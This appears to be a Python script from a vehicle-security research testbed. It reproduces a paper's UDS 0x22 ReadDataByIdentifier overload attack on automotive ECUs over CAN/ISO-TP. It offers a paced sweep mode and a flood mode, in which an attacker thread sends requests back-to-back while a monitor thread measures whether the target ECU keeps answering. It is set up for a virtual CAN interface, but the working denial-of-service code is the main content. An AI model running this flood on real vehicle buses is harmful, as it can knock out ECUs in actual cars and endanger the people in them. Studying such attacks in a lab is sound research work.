"""0x22 ReadDataByIdentifier overload attack (paper Section V-A).

Two modes:

--sweep (default): floods 0x22 at each interval in a ms sweep and measures
the response rate/latency of that *same* blocking request-response loop.
This is a self-throttling ping-pong -- each iteration waits for its own
response before sending the next -- so it mainly proves the request path
works; on a fast host it will rarely show real queueing, because the round
trip is faster than even the tightest interval.

--flood: a truer reproduction of the paper's method. One identity
(attacker, default CAN IDs 0x7E1/0x7E9) fires 0x22 requests back-to-back
without waiting for replies, while a second identity (monitor, default
0x7E0/0x7E8) sends its own paced 0x22 requests and measures whether *it*
keeps getting timely answers. Run this against `stateful_ecu.py`, which
serves both identities from a single process, so contention between them
is real. The paper watched a target ECU's periodic broadcast traffic
collapse under load; this testbed's reference ECUs don't emit periodic
traffic, so the monitor's own response rate/latency is the proxy here.

Usage:
    python3 attacks/overload_0x22.py --interface vcan0 --sweep-ms 0.5,1,2,5 --duration 3
    python3 attacks/overload_0x22.py --interface vcan0 --flood --duration 5
"""

from __future__ import annotations

import argparse
import socket as socket_module
import statistics
import threading
import time
from dataclasses import dataclass


def build_read_by_id(did: int) -> bytes:
    return bytes([0x22, (did >> 8) & 0xFF, did & 0xFF])


@dataclass
class IntervalResult:
    interval_ms: float
    sent: int
    answered: int
    latencies_ms: list

    @property
    def response_rate(self) -> float:
        return self.answered / self.sent if self.sent else 0.0

    @property
    def avg_latency_ms(self) -> float:
        return statistics.mean(self.latencies_ms) if self.latencies_ms else float("nan")


def summarize(interval_ms: float, samples: list) -> IntervalResult:
    """samples: list of (answered: bool, latency_ms: float | None)."""
    answered = [lat for ok, lat in samples if ok and lat is not None]
    return IntervalResult(interval_ms=interval_ms, sent=len(samples), answered=len(answered), latencies_ms=answered)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--interface", default="vcan0")
    parser.add_argument("--rx-id", type=lambda x: int(x, 0), default=0x7E8, help="[sweep] ECU's response CAN ID")
    parser.add_argument("--tx-id", type=lambda x: int(x, 0), default=0x7E0, help="[sweep] ECU's request CAN ID")
    parser.add_argument("--did", type=lambda x: int(x, 0), default=0xF190, help="target DataIdentifier")
    parser.add_argument(
        "--sweep-ms",
        default="0.1,0.2,0.3,0.4,0.5,0.6",
        help="[sweep] comma-separated request intervals in milliseconds, tried in order",
    )
    parser.add_argument("--duration", type=float, default=2.0, help="seconds of flooding (per interval in sweep mode)")
    parser.add_argument("--response-timeout", type=float, default=0.05, help="per-request wait for a response, seconds")
    parser.add_argument("--flood", action="store_true", help="use the dual-identity attacker+monitor flood instead of the sweep")
    parser.add_argument("--attacker-tx-id", type=lambda x: int(x, 0), default=0x7E1, help="[flood] attacker identity's request ID")
    parser.add_argument("--attacker-rx-id", type=lambda x: int(x, 0), default=0x7E9, help="[flood] attacker identity's response ID")
    parser.add_argument("--monitor-tx-id", type=lambda x: int(x, 0), default=0x7E0, help="[flood] monitor identity's request ID")
    parser.add_argument("--monitor-rx-id", type=lambda x: int(x, 0), default=0x7E8, help="[flood] monitor identity's response ID")
    parser.add_argument("--monitor-interval-ms", type=float, default=20.0, help="[flood] spacing between monitor probes")
    return parser.parse_args()


def run_interval(sock, did: int, interval_ms: float, duration: float, response_timeout: float) -> IntervalResult:
    request = build_read_by_id(did)
    samples = []
    deadline = time.monotonic() + duration
    next_send = time.monotonic()
    sock.settimeout(response_timeout)
    while time.monotonic() < deadline:
        now = time.monotonic()
        if now < next_send:
            time.sleep(next_send - now)
        sent_at = time.monotonic()
        sock.send(request)
        try:
            resp = sock.recv()
        except socket_module.timeout:
            resp = None
        if resp:
            latency_ms = (time.monotonic() - sent_at) * 1000
            samples.append((True, latency_ms))
        else:
            samples.append((False, None))
        next_send = sent_at + interval_ms / 1000.0
    return summarize(interval_ms, samples)


def _flood_loop(interface: str, tx_id: int, rx_id: int, did: int, stop: threading.Event) -> int:
    import isotp

    sock = isotp.socket()
    sock.bind(interface, isotp.Address(rxid=rx_id, txid=tx_id))
    request = build_read_by_id(did)
    sent = 0
    while not stop.is_set():
        sock.send(request)
        sent += 1
    return sent


def _monitor_loop(
    interface: str, tx_id: int, rx_id: int, did: int, interval_ms: float, duration: float, response_timeout: float
) -> IntervalResult:
    import isotp

    sock = isotp.socket()
    sock.bind(interface, isotp.Address(rxid=rx_id, txid=tx_id))
    sock.settimeout(response_timeout)
    request = build_read_by_id(did)
    samples = []
    deadline = time.monotonic() + duration
    while time.monotonic() < deadline:
        sent_at = time.monotonic()
        sock.send(request)
        try:
            resp = sock.recv()
        except socket_module.timeout:
            resp = None
        if resp:
            samples.append((True, (time.monotonic() - sent_at) * 1000))
        else:
            samples.append((False, None))
        elapsed = time.monotonic() - sent_at
        remaining = interval_ms / 1000.0 - elapsed
        if remaining > 0:
            time.sleep(remaining)
    return summarize(interval_ms, samples)


def run_flood(args: argparse.Namespace) -> None:
    print(
        f"[attacker] flooding 0x22 DID=0x{args.did:04X} on {args.interface} "
        f"(tx=0x{args.attacker_tx_id:03X}, rx=0x{args.attacker_rx_id:03X})"
    )
    print(
        f"[monitor] probing every {args.monitor_interval_ms}ms "
        f"(tx=0x{args.monitor_tx_id:03X}, rx=0x{args.monitor_rx_id:03X})"
    )
    stop = threading.Event()
    flood_thread = threading.Thread(
        target=_flood_loop,
        args=(args.interface, args.attacker_tx_id, args.attacker_rx_id, args.did, stop),
        daemon=True,
    )
    flood_thread.start()
    time.sleep(0.2)  # let the attacker identity's session/traffic ramp up first
    result = _monitor_loop(
        args.interface, args.monitor_tx_id, args.monitor_rx_id, args.did, args.monitor_interval_ms, args.duration, args.response_timeout
    )
    stop.set()
    flood_thread.join(timeout=1)
    print(f"{'sent':>6} {'answered':>9} {'rate':>7} {'avg latency(ms)':>16}")
    print(f"{result.sent:>6} {result.answered:>9} {result.response_rate * 100:>6.1f}% {result.avg_latency_ms:>16.2f}")


def run_sweep(args: argparse.Namespace) -> None:
    import isotp

    intervals = [float(x) for x in args.sweep_ms.split(",")]
    sock = isotp.socket()
    sock.bind(args.interface, isotp.Address(rxid=args.rx_id, txid=args.tx_id))
    print(f"Flooding 0x22 DID=0x{args.did:04X} on {args.interface} (tx=0x{args.tx_id:03X}, rx=0x{args.rx_id:03X})")

    print(f"{'interval(ms)':>13} {'sent':>6} {'answered':>9} {'rate':>7} {'avg latency(ms)':>16}")
    for interval_ms in intervals:
        result = run_interval(sock, args.did, interval_ms, args.duration, args.response_timeout)
        print(
            f"{result.interval_ms:>13.2f} {result.sent:>6} {result.answered:>9} "
            f"{result.response_rate * 100:>6.1f}% {result.avg_latency_ms:>16.2f}"
        )


def main() -> None:
    args = parse_args()
    if args.flood:
        run_flood(args)
    else:
        run_sweep(args)


if __name__ == "__main__":
    main()
